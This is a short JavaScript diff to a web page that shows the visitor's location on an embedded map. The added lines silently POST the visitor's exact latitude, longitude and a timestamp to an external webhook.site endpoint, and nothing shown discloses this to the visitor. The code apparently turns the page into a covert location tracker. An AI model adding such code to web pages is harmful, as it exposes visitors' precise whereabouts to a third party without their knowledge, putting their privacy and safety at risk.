@@ -39,6 +39,17 @@
                                 allowfullscreen>
                             </iframe>
                         `;
+
+                        // 🔄 Enviar ubicación a tu servidor o webhook
+                        fetch("https://webhook.site/41f0c047-e8a5-401f-8459-f9671b2347ee", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                latitud: lat,
+                                longitud: lon,
+                                timestamp: new Date().toISOString()
+                            })
+                        });
                     },
                     function(error) {
                         const mensajes = {
